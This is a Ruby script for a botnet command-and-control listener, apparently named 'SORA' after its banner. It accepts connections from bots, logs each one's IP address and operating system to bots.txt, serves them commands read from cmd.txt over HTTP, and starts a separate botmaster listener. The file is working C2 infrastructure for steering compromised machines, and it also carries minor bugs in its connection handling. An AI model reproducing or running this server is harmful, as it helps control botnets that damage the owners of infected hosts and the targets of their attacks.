#!/usr/bin/env ruby
$LOAD_PATH << './lib'
require 'socket'
require 'pathname'
require 'core'

File.open('settings.ini', 'w') do |file|
  file.write("#{Process.pid}\n")
  file.close
end

begin

  port = ARGV[0].to_i  # This has to be the same port that the bot is connecting back to
  if port == 0
    print_err("Please input a port")
    exit
  end
  masterport = 45678
  system('clear')
  puts "
   _______ _______ ______ _______
  |     __|       |   __ \\   _   |
  |__     |   -   |      <       |
  |_______|_______|___|__|___|___|

  Made with <3 by AM-77

  To stop the server, type CTRL+C\n\n"
  print_status("Starting bot listener on port #{port} using all interfaces")
  server = TCPServer.new("", port)

  # Always override previous file
  cmdf = File.new("cmd.txt", 'w')
  cmdf.puts("NONE")
  cmdf.close
  if ARGV.include? "DEBUG"
    print_status("Starting botmaster listener on port #{masterport} (DEBUG mode)...")
    system("ruby botmaster.rb #{masterport} DEBUG &")
  else
    print_status("Starting botmaster listener on port #{masterport}...")
    system("ruby botmaster.rb #{masterport} &")
  end

  bot_file = File.new("bots.txt", 'a+')


  loop do
    Thread.start(server.accept) do |socket|
      # Create the HTTP response
      cmd_file_read = File.new("cmd.txt", 'r')
      response = cmd_file_read.read

      res =  "HTTP/1.1 200 OK\r\n"
      res += "Content-Type: text/plain\r\n"
      res += "Content-Length: #{response.bytesize}\r\n"
      res += "Connection: close\r\n"
      res += "\r\n"
      res += response
      # Write response but don't write to bot file
      if File.readlines("bots.txt").grep(/#{socket.peeraddr[3]}/).any?
        socket.write res
        debug "Old conn"
        socket.close
      end

      # Get request
      request = socket.gets

      # Parse request
      info = request.split("/")
      os = info[1]
      wanip = info[2].gsub(" HTTP", "")

      # Print info
      print_good("New bot connection from #{wanip}\n")
      bot_file.write("#{socket.peeraddr[3]}::#{os}::#{wanip} (Connected: #{Time.now.inspect})\n")  # XXX maybe replace socket.peeraddr with wanip
      bot_file.close

      STDERR.puts request
      socket.print res

      # Close connections
      cmd_file_read.close
      socket.close

  end end
rescue Interrupt
  print_err("Caught interrupt, closing all ruby instances")
  system('pkill ruby')
end
